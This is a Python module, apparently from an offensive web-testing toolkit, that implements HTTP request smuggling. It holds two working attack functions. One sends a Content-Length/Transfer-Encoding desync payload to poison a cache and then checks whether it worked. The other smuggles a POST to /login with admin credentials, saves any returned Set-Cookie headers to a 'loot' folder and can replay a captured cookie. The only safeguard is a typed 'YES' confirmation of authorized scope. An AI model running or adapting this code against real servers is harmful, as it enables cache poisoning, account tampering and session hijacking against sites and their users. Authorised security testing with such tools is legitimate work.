import os, time, socket
from datetime import datetime
from .http_utils import parse_status_and_headers, normalize_target

def _send(sock, s):
    sock.sendall(s.encode('latin-1','ignore'))
def _recv(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            part = sock.recv(4096)
            if not part: break
            data += part
    except socket.timeout:
        pass
    return data

def _log(dirpath, basename, payload, resp):
    os.makedirs(dirpath, exist_ok=True)
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    p = os.path.join(dirpath, f"{basename}_{ts}.txt")
    with open(p,"w",encoding="latin-1") as f:
        f.write("--- PAYLOAD ---\n")
        f.write(payload)
        f.write("\n--- RESPONSE ---\n")
        f.write(resp.decode("latin-1","ignore"))
    return p

def cache_poison(target, top_payload=None, verify_path="/", active=False, verify_reqs=3):
    """Cache poisoning attack with optional payload"""
    host, port = normalize_target(target)
    
    # Generate default payload if none provided
    if top_payload is None:
        import random
        import string
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        top_payload = f"""POST / HTTP/1.1\r
Host: {host}\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
GET /poisoned-{random_str} HTTP/1.1\r
Host: {host}\r
\r\n"""
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((host,port))
    _send(s, top_payload)
    resp = _recv(s)
    s.close()
    logp = _log("loot", "cache_poison_send", top_payload, resp)
    print(f"[+] Sent poison candidate. Log: {logp}")

    # verification fetches
    hits = 0
    for i in range(verify_reqs):
        req = f"GET {verify_path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s2.connect((host,port))
        _send(s2, req); r2 = _recv(s2); s2.close()
        status, hdrs = parse_status_and_headers(r2)
        if status and 200 <= status < 400:
            hits += 1
        _log("loot", "cache_poison_verify", req, r2)
        time.sleep(0.3)
    print(f"[+] Verification hits: {hits}/{verify_reqs} (check logs for cache headers like Age, Via, X-Cache)")
    return hits

def login_inject(target, top_payload=None, replay=False, replay_path="/", confirm_text="YES"):
    """Login injection attack with optional payload"""
    host, port = normalize_target(target)
    
    # Generate default payload if none provided
    if top_payload is None:
        top_payload = f"""POST / HTTP/1.1\r
Host: {host}\r
Transfer-Encoding: chunked\r
Content-Length: 4\r
\r
0\r\n\r\n
POST /login HTTP/1.1\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 28\r
\r
username=admin&password=hacked"""
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((host,port))
    _send(s, top_payload)
    resp = _recv(s)
    s.close()
    logp = _log("loot","login_inject_send", top_payload, resp)
    status, hdrs = parse_status_and_headers(resp)
    cookies = hdrs.get("set-cookie", [])
    if cookies:
        cpath = os.path.join("loot", f"cookies_{host}_{port}.json")
        import json
        with open(cpath,"w") as jf:
            json.dump({"cookies": cookies, "ts": time.time()}, jf, indent=2)
        print(f"[+] Captured Set-Cookie headers ({len(cookies)}). Saved: {cpath}")
    else:
        print("[!] No Set-Cookie observed in immediate response. Might still be exploitable in mixed traffic scenarios.")

    if replay:
        user = input("Type YES to confirm cookie replay in authorized scope: ").strip()
        if user != confirm_text:
            print("[i] Replay aborted.")
            return False
        # Minimal replay using first cookie
        if cookies:
            cookie_line = cookies[0].split(";",1)[0]
            req = (
                f"GET {replay_path} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Cookie: {cookie_line}\r\n"
                "Connection: close\r\n\r\n"
            )
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s2.connect((host,port))
            _send(s2, req); r2 = _recv(s2); s2.close()
            _log("loot","login_inject_replay", req, r2)
            print("[+] Replay attempt logged. Manually verify auth context in the response.")
        else:
            print("[!] No cookies to replay.")
    return True
